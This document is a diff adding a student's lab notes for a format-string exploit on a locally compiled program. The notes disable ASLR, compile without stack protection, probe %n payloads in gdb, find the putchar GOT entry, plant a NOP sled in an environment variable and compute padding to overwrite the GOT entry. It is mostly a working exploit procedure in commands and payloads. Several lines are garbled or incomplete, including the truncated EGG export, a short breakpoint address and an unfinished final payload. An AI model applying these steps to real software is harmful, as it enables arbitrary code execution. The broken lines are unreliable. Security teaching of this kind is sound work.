@@ -1,0 +1,61 @@
+LECTURE 10 TRYOUT 
+
+sudo su
+echo 0 > /proc/sys/kernel/randomize_va_space  ----> First it will be  2
+cat /proc/sys/kernel/randomize_va_space       ----> we  get 0 
+
+gcc formatstring.c -fno-stack-protector -z execstack
+gdb ./a.out
+
+
+Now in Gdb
+r AAAA-%4$n  ----> SEG Fault
+x/i $eip
+p/x $ecx
+p/x $eax
+
+r AAAABBBB-%4\$n ---->SEG Fault
+x/i $eip
+p/x $ecx 
+p/x $eax
+
+r AAAABBBB-%10u-%4\$n ---->SEG Fault
+x/i $eip
+p/x $ecx
+p/x $eax
+
+OUT of Gdb
+objdump -R gives putchar 
+
+gdb ./a.out
+disass putchar
+disass main
+x/5i 0x08048370
+p/x *0x804a01c 
+x/5i 0x8048320
+p/x *0x804a008
+b *0x0804847
+
+REPLACING AAAA With Address 
+x/x 0x0804a01c
+r $(python -c 'print"\x1c\xa0\x04\x08"')-%4\$n ----->We get SEG fault
+x/x 0x0804a01c
+r $(python -c 'print"\x1c\xa0\x04\x08"')-%10u-%4\$n ---->Seg Fault
+x/x 0x0804a01c 
+export EGG=$(python -c 'print"\x90"*500+                                 ");
+gdb ./a.out
+b main 
+find $esp,$esp+2000,0x90909090
+x/10i 0xbffff500 ----> we get all next 10 nops
+
+Next we have to write 0xbffff500 into GOT entry
+
+$(python -c 'print"\x1c\xa0\x04\x08"+"\x12\xa0\x04\x08"');
+x/20wx $esp
+
+./a.out $(python -c 'print "\x1c\xa0\x04\x08"+"\x1e\xa0\x04\x08"')-%62710u-%4\$n         _____HINT 1bfff-f500 =51967
+												    f500-a  = 62710
+$(python -c 'print"\x1c\xa0\x04\x08"+"\x1e\xa0\x04\x08"')-%62710u-%4\$n%51967
+
+
+
